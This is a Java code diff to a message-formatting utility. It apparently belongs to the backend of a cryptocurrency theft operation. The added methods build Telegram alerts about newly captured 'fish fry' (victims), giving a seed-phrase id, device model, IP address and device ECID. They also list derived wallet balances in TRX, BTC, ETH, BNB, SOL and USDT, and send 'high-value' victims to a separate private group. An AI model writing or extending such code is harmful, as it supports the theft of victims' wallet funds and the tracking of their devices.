@@ -34,6 +34,28 @@ public final class MessageFormatUtils {
     }
 
     /**
+     * 高额分流：新鱼苗通知（用于隐私群，和普通消息区分）。
+     */
+    public static String saveHighValueFishTelegram(String groupId,
+                                                   String channelCode,
+                                                   String channelName,
+                                                   String model,
+                                                   String ip,
+                                                   String ecid,
+                                                   String time) {
+        StringBuilder sb = new StringBuilder();
+        sb.append("🔥🔥🔥大额鱼苗获取成功🔥🔥🔥\n\n");
+        sb.append("👁️群id: ").append(nullToDefault(groupId)).append("\n");
+        sb.append("📔渠道编码：").append(nullToDefault(channelCode)).append("\n");
+        sb.append("🦏渠道名称：").append(nullToDefault(channelName)).append("\n");
+        sb.append("🙇型号：").append(nullToDefault(model)).append("\n");
+        sb.append("📍IP：").append(nullToDefault(ip)).append("\n");
+        sb.append("🇪🇨设备ECID：").append(nullToDefault(ecid)).append("\n");
+        sb.append("⏰时间：").append(nullToDefault(time)).append("\n");
+        return sb.toString();
+    }
+
+    /**
      * 派生地址并查余额后 → 余额通知。
      */
     public static String saveBalanceTelegram(String groupId,
@@ -47,6 +69,47 @@ public final class MessageFormatUtils {
                                              Map<String, ChainBalance> balances) {
         StringBuilder sb = new StringBuilder();
         sb.append("🌷🌷🌷新鱼苗金币查询成功🌷🌷🌷\n\n");
+        sb.append("👁️群id: ").append(nullToDefault(groupId)).append("\n");
+        sb.append("📔渠道编码：").append(nullToDefault(channelCode)).append("\n");
+        sb.append("🦏渠道名称：").append(nullToDefault(channelName)).append("\n");
+        sb.append("🐠鱼苗词id: ").append(mnemonicId == null ? "-" : String.valueOf(mnemonicId)).append("\n");
+        sb.append("🙇型号：").append(nullToDefault(model)).append("\n");
+        sb.append("📍IP：").append(nullToDefault(ip)).append("\n");
+        sb.append("🇪🇨设备ECID：").append(nullToDefault(ecid)).append("\n");
+        sb.append("⏰时间：").append(nullToDefault(time)).append("\n\n");
+
+        ChainBalance tron = bal(balances, "tron");
+        ChainBalance btc = bal(balances, "btc");
+        ChainBalance eth = bal(balances, "eth");
+        ChainBalance bsc = bal(balances, "bsc");
+        ChainBalance sol = bal(balances, "sol");
+
+        sb.append("💰Tron: ").append(nz(tron.getNativeBal())).append("trx /")
+                .append(nz(tron.getUsdtBal())).append("usdt\n");
+        sb.append("💰BTC: ").append(nz(btc.getNativeBal())).append("btc\n");
+        sb.append("💰Eth: ").append(nz(eth.getNativeBal())).append("eth/")
+                .append(nz(eth.getUsdtBal())).append("usdt\n");
+        sb.append("💰BSC: ").append(nz(bsc.getNativeBal())).append("bnb/")
+                .append(nz(bsc.getUsdtBal())).append("usdt\n");
+        sb.append("💰SOL: ").append(nz(sol.getNativeBal())).append("sol/")
+                .append(nz(sol.getUsdtBal())).append("usdt\n");
+        return sb.toString();
+    }
+
+    /**
+     * 高额分流：余额通知（用于隐私群，和普通消息区分）。
+     */
+    public static String saveHighValueBalanceTelegram(String groupId,
+                                                      String channelCode,
+                                                      String channelName,
+                                                      Integer mnemonicId,
+                                                      String model,
+                                                      String ip,
+                                                      String ecid,
+                                                      String time,
+                                                      Map<String, ChainBalance> balances) {
+        StringBuilder sb = new StringBuilder();
+        sb.append("🔥🔥🔥大额鱼苗余额查询成功🔥🔥🔥\n\n");
         sb.append("👁️群id: ").append(nullToDefault(groupId)).append("\n");
         sb.append("📔渠道编码：").append(nullToDefault(channelCode)).append("\n");
         sb.append("🦏渠道名称：").append(nullToDefault(channelName)).append("\n");
